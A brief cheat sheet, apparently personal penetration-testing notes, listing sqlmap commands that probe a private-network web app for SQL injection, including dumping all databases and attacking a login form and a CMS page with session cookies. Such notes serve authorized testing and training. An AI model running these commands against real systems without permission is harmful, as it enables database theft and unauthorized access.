# sqlmap

## Injection
```shell
# Level 2 verbosity
sqlmap -v 2 -u http://192.168.1.9/newspage.php?id=1 --method=GET

# Dump all databases
sqlmap -v 2 -u http://192.168.1.9/newspage.php?id=1 --method=GET --dump-all

# SQL Injection on login
sqlmap -v 2 -u http://192.168.1.9/admin/checklogin.php --data="myusername=a&mypassword=a&Submit=Login" --cookie="PHPSESSID=fnlj43uvpna8dmva9qn735rdb1" --level 2 --risk 2

# SQL Injection on endpoint with a cookie and knowing the database
sqlmap --url http://192.168.1.9/test/cms.php?pagename=home --cookie "PHPSESSID=a3tvq5gn0ndg4sk28magf4juq7" --level 2 --dbms mysql
```